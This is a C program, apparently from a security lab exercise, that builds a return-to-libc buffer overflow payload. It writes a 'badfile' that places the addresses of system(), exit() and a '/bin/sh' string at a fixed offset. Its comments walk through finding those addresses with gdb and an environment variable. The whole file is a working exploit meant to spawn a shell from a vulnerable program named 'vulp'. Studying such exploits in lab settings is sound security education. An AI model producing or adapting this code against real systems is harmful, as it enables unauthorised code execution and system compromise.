#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* gdb ./vulp
 * > b vul
 * > r
 * > info frame
 * (run and find offset)
 */
#define BASEOFFSET  28

/* gdb ./vulp
 * > b vul
 * > r ...
 * > p system
 */
#define ADDRSYSTEM  0x4aad2520

/* gdb ./vulp
 * > b vul
 * > r ...
 * > p exit
 */
#define ADDREXIT    0x4aac5dd0

/* export VARSHELL="         /bin/sh" (space is needed)
 * ./getshelladdr
 * gdb ./vulp
 * (find exact address of string "/bin/sh")
 */
#define ADDRBASH    0xbfffff04

#define N 64
 
int main(int argc, char **argv)
{
    char buffer[N];
    FILE *badfile;
     
    memset(buffer, 1, sizeof(buffer));
    *(long *) &buffer[BASEOFFSET] = ADDRSYSTEM;
    *(long *) &buffer[BASEOFFSET+4] = ADDREXIT;
    *(long *) &buffer[BASEOFFSET+8] = ADDRBASH;

    badfile = fopen("./badfile", "w");
    fwrite(buffer, 1, N, badfile);
    fclose(badfile);
}
